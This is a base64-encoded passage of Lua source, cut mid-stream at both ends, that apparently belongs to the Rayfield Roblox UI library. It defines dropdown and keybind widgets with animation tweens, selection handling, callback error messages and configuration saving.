jZTpDcmVhdGUoRHJvcGRvd25PcHQuVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCQkJCWVuZAoJCQkJCWVuZAoJCQkJZW5kCgkJCWVuZCkKCgkJCURyb3Bkb3duLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlpZiBub3QgRHJvcGRvd24uTGlzdC5WaXNpYmxlIHRoZW4KCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZEhvdmVyfSk6UGxheSgpCgkJCQllbmQKCQkJZW5kKQoKCQkJRHJvcGRvd24uTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24sIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kfSk6UGxheSgpCgkJCWVuZCkKCgkJCWxvY2FsIGZ1bmN0aW9uIFNldERyb3Bkb3duT3B0aW9ucygpCgkJCQlmb3IgXywgT3B0aW9uIGluIGlwYWlycyhEcm9wZG93blNldHRpbmdzLk9wdGlvbnMpIGRvCgkJCQkJbG9jYWwgRHJvcGRvd25PcHRpb24gPSBFbGVtZW50cy5UZW1wbGF0ZS5Ecm9wZG93bi5MaXN0LlRlbXBsYXRlOkNsb25lKCkKCQkJCQlEcm9wZG93bk9wdGlvbi5OYW1lID0gT3B0aW9uCgkJCQkJRHJvcGRvd25PcHRpb24uVGl0bGUuVGV4dCA9IE9wdGlvbgoJCQkJCURyb3Bkb3duT3B0aW9uLlBhcmVudCA9IERyb3Bkb3duLkxpc3QKCQkJCQlEcm9wZG93bk9wdGlvbi5WaXNpYmxlID0gdHJ1ZQoKCQkJCQlEcm9wZG93bk9wdGlvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoJCQkJCURyb3Bkb3duT3B0aW9uLlVJU3Ryb2tlLlRyYW5zcGFyZW5jeSA9IDEKCQkJCQlEcm9wZG93bk9wdGlvbi5UaXRsZS5UZXh0VHJhbnNwYXJlbmN5ID0gMQoKCQkJCQktLWxvY2FsIERyb3Bkb3duID0gVGFiOkNyZWF0ZURyb3Bkb3duKHsKCQkJCQktLQlOYW1lID0gIkRyb3Bkb3duIEV4YW1wbGUiLAoJCQkJCS0tCU9wdGlvbnMgPSB7Ik9wdGlvbiAxIiwiT3B0aW9uIDIifSwKCQkJCQktLQlDdXJyZW50T3B0aW9uID0geyJPcHRpb24gMSJ9LAoJCQkJCS0tICBNdWx0aXBsZU9wdGlvbnMgPSB0cnVlLAoJCQkJCS0tCUZsYWcgPSAiRHJvcGRvd24xIiwKCQkJCQktLQlDYWxsYmFjayA9IGZ1bmN0aW9uKFRhYmxlT2ZPcHRpb25zKQoKCQkJCQktLQllbmQsCgkJCQkJLS19KQoKCgkJCQkJRHJvcGRvd25PcHRpb24uSW50ZXJhY3QuWkluZGV4ID0gNTAKCQkJCQlEcm9wZG93bk9wdGlvbi5JbnRlcmFjdC5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCQkJaWYgbm90IERyb3Bkb3duU2V0dGluZ3MuTXVsdGlwbGVPcHRpb25zIGFuZCB0YWJsZS5maW5kKERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbiwgT3B0aW9uKSB0aGVuIAoJCQkJCQkJcmV0dXJuCgkJCQkJCWVuZAoKCQkJCQkJaWYgdGFibGUuZmluZChEcm9wZG93blNldHRpbmdzLkN1cnJlbnRPcHRpb24sIE9wdGlvbikgdGhlbgoJCQkJCQkJdGFibGUucmVtb3ZlKERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbiwgdGFibGUuZmluZChEcm9wZG93blNldHRpbmdzLkN1cnJlbnRPcHRpb24sIE9wdGlvbikpCgkJCQkJCQlpZiBEcm9wZG93blNldHRpbmdzLk11bHRpcGxlT3B0aW9ucyB0aGVuCgkJCQkJCQkJaWYgI0Ryb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbiA9PSAxIHRoZW4KCQkJCQkJCQkJRHJvcGRvd24uU2VsZWN0ZWQuVGV4dCA9IERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvblsxXQoJCQkJCQkJCWVsc2VpZiAjRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uID09IDAgdGhlbgoJCQkJCQkJCQlEcm9wZG93bi5TZWxlY3RlZC5UZXh0ID0gIk5vbmUiCgkJCQkJCQkJZWxzZQoJCQkJCQkJCQlEcm9wZG93bi5TZWxlY3RlZC5UZXh0ID0gIlZhcmlvdXMiCgkJCQkJCQkJZW5kCgkJCQkJCQllbHNlCgkJCQkJCQkJRHJvcGRvd24uU2VsZWN0ZWQuVGV4dCA9IERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvblsxXQoJCQkJCQkJZW5kCgkJCQkJCWVsc2UKCQkJCQkJCWlmIG5vdCBEcm9wZG93blNldHRpbmdzLk11bHRpcGxlT3B0aW9ucyB0aGVuCgkJCQkJCQkJdGFibGUuY2xlYXIoRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uKQoJCQkJCQkJZW5kCgkJCQkJCQl0YWJsZS5pbnNlcnQoRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uLCBPcHRpb24pCgkJCQkJCQlpZiBEcm9wZG93blNldHRpbmdzLk11bHRpcGxlT3B0aW9ucyB0aGVuCgkJCQkJCQkJaWYgI0Ryb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbiA9PSAxIHRoZW4KCQkJCQkJCQkJRHJvcGRvd24uU2VsZWN0ZWQuVGV4dCA9IERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvblsxXQoJCQkJCQkJCWVsc2VpZiAjRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uID09IDAgdGhlbgoJCQkJCQkJCQlEcm9wZG93bi5TZWxlY3RlZC5UZXh0ID0gIk5vbmUiCgkJCQkJCQkJZWxzZQoJCQkJCQkJCQlEcm9wZG93bi5TZWxlY3RlZC5UZXh0ID0gIlZhcmlvdXMiCgkJCQkJCQkJZW5kCgkJCQkJCQllbHNlCgkJCQkJCQkJRHJvcGRvd24uU2VsZWN0ZWQuVGV4dCA9IERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvblsxXQoJCQkJCQkJZW5kCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duT3B0aW9uLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duT3B0aW9uLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5Ecm9wZG93blNlbGVjdGVkfSk6UGxheSgpCgkJCQkJCQlEZWJvdW5jZSA9IHRydWUKCQkJCQkJZW5kCgoKCQkJCQkJbG9jYWwgU3VjY2VzcywgUmVzcG9uc2UgPSBwY2FsbChmdW5jdGlvbigpCgkJCQkJCQlEcm9wZG93blNldHRpbmdzLkNhbGxiYWNrKERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbikKCQkJCQkJZW5kKQoKCQkJCQkJaWYgbm90IFN1Y2Nlc3MgdGhlbgoJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93biwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDg1LCAwLCAwKX0pOlBsYXkoKQoJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93bi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCQkJRHJvcGRvd24uVGl0bGUuVGV4dCA9ICJDYWxsYmFjayBFcnJvciIKCQkJCQkJCXByaW50KCJSYXlmaWVsZCB8ICIuLkRyb3Bkb3duU2V0dGluZ3MuTmFtZS4uIiBDYWxsYmFjayBFcnJvciAiIC4udG9zdHJpbmcoUmVzcG9uc2UpKQoJCQkJCQkJd2FybignQ2hlY2sgZG9jcy5zaXJpdXMubWVudSBmb3IgaGVscCB3aXRoIFJheWZpZWxkIHNwZWNpZmljIGRldmVsb3BtZW50LicpCgkJCQkJCQl0YXNrLndhaXQoMC41KQoJCQkJCQkJRHJvcGRvd24uVGl0bGUuVGV4dCA9IERyb3Bkb3duU2V0dGluZ3MuTmFtZQoJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93biwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmR9KTpQbGF5KCkKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCQkJZW5kCgoJCQkJCQlmb3IgXywgZHJvcHRpb24gaW4gaXBhaXJzKERyb3Bkb3duLkxpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8KCQkJCQkJCWlmIGRyb3B0aW9uLkNsYXNzTmFtZSA9PSAiRnJhbWUiIGFuZCBkcm9wdGlvbi5OYW1lIH49ICJQbGFjZWhvbGRlciIgYW5kIG5vdCB0YWJsZS5maW5kKERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbiwgZHJvcHRpb24uTmFtZSkgdGhlbgoJCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZHJvcHRpb24sIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkRyb3Bkb3duVW5zZWxlY3RlZH0pOlBsYXkoKQoJCQkJCQkJZW5kCgkJCQkJCWVuZAoJCQkJCQlpZiBub3QgRHJvcGRvd25TZXR0aW5ncy5NdWx0aXBsZU9wdGlvbnMgdGhlbgoJCQkJCQkJdGFzay53YWl0KDAuMSkKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24sIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMSwgLTEwLCAwLCA0NSl9KTpQbGF5KCkKCQkJCQkJCWZvciBfLCBEcm9wZG93bk9wdCBpbiBpcGFpcnMoRHJvcGRvd24uTGlzdDpHZXRDaGlsZHJlbigpKSBkbwoJCQkJCQkJCWlmIERyb3Bkb3duT3B0LkNsYXNzTmFtZSA9PSAiRnJhbWUiIGFuZCBEcm9wZG93bk9wdC5OYW1lIH49ICJQbGFjZWhvbGRlciIgdGhlbgoJCQkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duT3B0LCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duT3B0LlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd25PcHQuVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCQkJZW5kCgkJCQkJCQllbmQKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24uTGlzdCwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2Nyb2xsQmFySW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duLlRvZ2dsZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7Um90YXRpb24gPSAxODB9KTpQbGF5KCkJCgkJCQkJCQl0YXNrLndhaXQoMC4zNSkKCQkJCQkJCURyb3Bkb3duLkxpc3QuVmlzaWJsZSA9IGZhbHNlCgkJCQkJCWVuZAoJCQkJCQlEZWJvdW5jZSA9IGZhbHNlCgkJCQkJCWlmIG5vdCBEcm9wZG93blNldHRpbmdzLkV4dCB0aGVuCgkJCQkJCQlTYXZlQ29uZmlndXJhdGlvbigpCgkJCQkJCWVuZAoJCQkJCWVuZCkKCgkJCQkJUmF5ZmllbGQuTWFpbjpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoJ0JhY2tncm91bmRDb2xvcjMnKTpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCQkJRHJvcGRvd25PcHRpb24uVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRTdHJva2UKCQkJCQllbmQpCgkJCQllbmQKCQkJZW5kCgkJCVNldERyb3Bkb3duT3B0aW9ucygpCgoJCQlmb3IgXywgZHJvcHRpb24gaW4gaXBhaXJzKERyb3Bkb3duLkxpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8KCQkJCWlmIGRyb3B0aW9uLkNsYXNzTmFtZSA9PSAiRnJhbWUiIGFuZCBkcm9wdGlvbi5OYW1lIH49ICJQbGFjZWhvbGRlciIgdGhlbgoJCQkJCWlmIG5vdCB0YWJsZS5maW5kKERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbiwgZHJvcHRpb24uTmFtZSkgdGhlbgoJCQkJCQlkcm9wdGlvbi5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5Ecm9wZG93blVuc2VsZWN0ZWQKCQkJCQllbHNlCgkJCQkJCWRyb3B0aW9uLkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkRyb3Bkb3duU2VsZWN0ZWQKCQkJCQllbmQKCgkJCQkJUmF5ZmllbGQuTWFpbjpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoJ0JhY2tncm91bmRDb2xvcjMnKTpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCQkJaWYgbm90IHRhYmxlLmZpbmQoRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uLCBkcm9wdGlvbi5OYW1lKSB0aGVuCgkJCQkJCQlkcm9wdGlvbi5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5Ecm9wZG93blVuc2VsZWN0ZWQKCQkJCQkJZWxzZQoJCQkJCQkJZHJvcHRpb24uQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRHJvcGRvd25TZWxlY3RlZAoJCQkJCQllbmQKCQkJCQllbmQpCgkJCQllbmQKCQkJZW5kCgoJCQlmdW5jdGlvbiBEcm9wZG93blNldHRpbmdzOlNldChOZXdPcHRpb24pCgkJCQlEcm9wZG93blNldHRpbmdzLkN1cnJlbnRPcHRpb24gPSBOZXdPcHRpb24KCgkJCQlpZiB0eXBlb2YoRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uKSA9PSAic3RyaW5nIiB0aGVuCgkJCQkJRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uID0ge0Ryb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbn0KCQkJCWVuZAoKCQkJCWlmIG5vdCBEcm9wZG93blNldHRpbmdzLk11bHRpcGxlT3B0aW9ucyB0aGVuCgkJCQkJRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uID0ge0Ryb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvblsxXX0KCQkJCWVuZAoKCQkJCWlmIERyb3Bkb3duU2V0dGluZ3MuTXVsdGlwbGVPcHRpb25zIHRoZW4KCQkJCQlpZiAjRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uID09IDEgdGhlbgoJCQkJCQlEcm9wZG93bi5TZWxlY3RlZC5UZXh0ID0gRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uWzFdCgkJCQkJZWxzZWlmICNEcm9wZG93blNldHRpbmdzLkN1cnJlbnRPcHRpb24gPT0gMCB0aGVuCgkJCQkJCURyb3Bkb3duLlNlbGVjdGVkLlRleHQgPSAiTm9uZSIKCQkJCQllbHNlCgkJCQkJCURyb3Bkb3duLlNlbGVjdGVkLlRleHQgPSAiVmFyaW91cyIKCQkJCQllbmQKCQkJCWVsc2UKCQkJCQlEcm9wZG93bi5TZWxlY3RlZC5UZXh0ID0gRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uWzFdCgkJCQllbmQKCgoJCQkJbG9jYWwgU3VjY2VzcywgUmVzcG9uc2UgPSBwY2FsbChmdW5jdGlvbigpCgkJCQkJRHJvcGRvd25TZXR0aW5ncy5DYWxsYmFjayhOZXdPcHRpb24pCgkJCQllbmQpCgkJCQlpZiBub3QgU3VjY2VzcyB0aGVuCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93biwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDg1LCAwLCAwKX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQlEcm9wZG93bi5UaXRsZS5UZXh0ID0gIkNhbGxiYWNrIEVycm9yIgoJCQkJCXByaW50KCJSYXlmaWVsZCB8ICIuLkRyb3Bkb3duU2V0dGluZ3MuTmFtZS4uIiBDYWxsYmFjayBFcnJvciAiIC4udG9zdHJpbmcoUmVzcG9uc2UpKQoJCQkJCXdhcm4oJ0NoZWNrIGRvY3Muc2lyaXVzLm1lbnUgZm9yIGhlbHAgd2l0aCBSYXlmaWVsZCBzcGVjaWZpYyBkZXZlbG9wbWVudC4nKQoJCQkJCXRhc2sud2FpdCgwLjUpCgkJCQkJRHJvcGRvd24uVGl0bGUuVGV4dCA9IERyb3Bkb3duU2V0dGluZ3MuTmFtZQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24sIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93bi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJZW5kCgoJCQkJZm9yIF8sIGRyb3B0aW9uIGluIGlwYWlycyhEcm9wZG93bi5MaXN0OkdldENoaWxkcmVuKCkpIGRvCgkJCQkJaWYgZHJvcHRpb24uQ2xhc3NOYW1lID09ICJGcmFtZSIgYW5kIGRyb3B0aW9uLk5hbWUgfj0gIlBsYWNlaG9sZGVyIiB0aGVuCgkJCQkJCWlmIG5vdCB0YWJsZS5maW5kKERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbiwgZHJvcHRpb24uTmFtZSkgdGhlbgoJCQkJCQkJZHJvcHRpb24uQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRHJvcGRvd25VbnNlbGVjdGVkCgkJCQkJCWVsc2UKCQkJCQkJCWRyb3B0aW9uLkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkRyb3Bkb3duU2VsZWN0ZWQKCQkJCQkJZW5kCgkJCQkJZW5kCgkJCQllbmQKCQkJCS0tU2F2ZUNvbmZpZ3VyYXRpb24oKQoJCQllbmQKCgkJCWZ1bmN0aW9uIERyb3Bkb3duU2V0dGluZ3M6UmVmcmVzaChvcHRpb25zVGFibGU6IHRhYmxlKSAtLSB1cGRhdGVzIGEgZHJvcGRvd24gd2l0aCBuZXcgb3B0aW9ucyBmcm9tIG9wdGlvbnNUYWJsZQoJCQkJRHJvcGRvd25TZXR0aW5ncy5PcHRpb25zID0gb3B0aW9uc1RhYmxlCgkJCQlmb3IgXywgb3B0aW9uIGluIERyb3Bkb3duLkxpc3Q6R2V0Q2hpbGRyZW4oKSBkbwoJCQkJCWlmIG9wdGlvbi5DbGFzc05hbWUgPT0gIkZyYW1lIiBhbmQgb3B0aW9uLk5hbWUgfj0gIlBsYWNlaG9sZGVyIiB0aGVuCgkJCQkJCW9wdGlvbjpEZXN0cm95KCkKCQkJCQllbmQKCQkJCWVuZAoJCQkJU2V0RHJvcGRvd25PcHRpb25zKCkKCQkJZW5kCgoJCQlpZiBTZXR0aW5ncy5Db25maWd1cmF0aW9uU2F2aW5nIHRoZW4KCQkJCWlmIFNldHRpbmdzLkNvbmZpZ3VyYXRpb25TYXZpbmcuRW5hYmxlZCBhbmQgRHJvcGRvd25TZXR0aW5ncy5GbGFnIHRoZW4KCQkJCQlSYXlmaWVsZExpYnJhcnkuRmxhZ3NbRHJvcGRvd25TZXR0aW5ncy5GbGFnXSA9IERyb3Bkb3duU2V0dGluZ3MKCQkJCWVuZAoJCQllbmQKCgkJCVJheWZpZWxkLk1haW46R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCdCYWNrZ3JvdW5kQ29sb3IzJyk6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlEcm9wZG93bi5Ub2dnbGUuSW1hZ2VDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlRleHRDb2xvcgoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93biwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmR9KTpQbGF5KCkKCQkJZW5kKQoKCQkJcmV0dXJuIERyb3Bkb3duU2V0dGluZ3MKCQllbmQKCgkJLS0gS2V5YmluZAoJCWZ1bmN0aW9uIFRhYjpDcmVhdGVLZXliaW5kKEtleWJpbmRTZXR0aW5ncykKCQkJbG9jYWwgQ2hlY2tpbmdGb3JLZXkgPSBmYWxzZQoJCQlsb2NhbCBLZXliaW5kID0gRWxlbWVudHMuVGVtcGxhdGUuS2V5YmluZDpDbG9uZSgpCgkJCUtleWJpbmQuTmFtZSA9IEtleWJpbmRTZXR0aW5ncy5OYW1lCgkJCUtleWJpbmQuVGl0bGUuVGV4dCA9IEtleWJpbmRTZXR0aW5ncy5OYW1lCgkJCUtleWJpbmQuVmlzaWJsZSA9IHRydWUKCQkJS2V5YmluZC5QYXJlbnQgPSBUYWJQYWdlCgoJCQlLZXliaW5kLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCgkJCUtleWJpbmQuVUlTdHJva2UuVHJhbnNwYXJlbmN5ID0gMQoJCQlLZXliaW5kLlRpdGxlLlRleHRUcmFuc3BhcmVuY3kgPSAxCgoJCQlLZXliaW5kLktleWJpbmRGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5JbnB1dEJhY2tncm91bmQKCQkJS2V5YmluZC5LZXliaW5kRnJhbWUuVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLklucHV0U3Ryb2tlCgoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleWJpbmQsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5YmluZC5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleWJpbmQuVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCQoKCQkJS2V5YmluZC5LZXliaW5kRnJhbWUuS2V5YmluZEJveC5UZXh0ID0gS2V5YmluZFNldHRpbmdzLkN1cnJlbnRLZXliaW5kCgkJCUtleWJpbmQuS2V5YmluZEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgS2V5YmluZC5LZXliaW5kRnJhbWUuS2V5YmluZEJveC5UZXh0Qm91bmRzLlggKyAyNCwgMCwgMzApCgoJCQlLZXliaW5kLktleWJpbmRGcmFtZS5LZXliaW5kQm94LkZvY3VzZWQ6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlDaGVja2luZ0ZvcktleSA9IHRydWUKCQkJCUtleWJpbmQuS2V5YmluZEZyYW1lLktleWJpbmRCb3guVGV4dCA9ICIiCgkJCWVuZCkKCQkJS2V5YmluZC5LZXliaW5kRnJhbWUuS2V5YmluZEJveC5Gb2N1c0xvc3Q6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlDaGVja2luZ0ZvcktleSA9IGZhbHNlCgkJCQlpZiBLZXliaW5kLktleWJpbmRGcmFtZS5LZXliaW5kQm94LlRleHQgPT0gbmlsIG9yICIiIHRoZW4KCQkJCQlLZXliaW5kLktleWJpbmRGcmFtZS5LZXliaW5kQm94LlRleHQgPSBLZXliaW5kU2V0dGluZ3MuQ3VycmVudEtleWJpbmQKCQkJCQlpZiBub3QgS2V5YmluZFNldHRpbmdzLkV4dCB0aGVuCgkJCQkJCVNhdmVDb25maWd1cmF0aW9uKCkKCQkJCQllbmQKCQkJCWVuZAoJCQllbmQpCgoJCQlLZXliaW5kLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleWJpbmQsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kSG92ZXJ9KTpQbGF5KCkKCQkJZW5kKQoKCQkJS2V5YmluZC5Nb3VzZUxlYXZlOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXliaW5kLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZH0pOlBsYXkoKQoJCQllbmQpCgoJCQlVc2VySW5wdXRTZXJ2aWNlLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dCwgcHJvY2Vzc2VkKQoJCQkJaWYgQ2hlY2tpbmdGb3JLZXkgdGhlbgoJCQkJCWlmIGlucHV0LktleUNvZGUgfj0gRW51bS5LZXlDb2RlLlVua25vd24gdGhlbgoJCQkJCQlsb2NhbC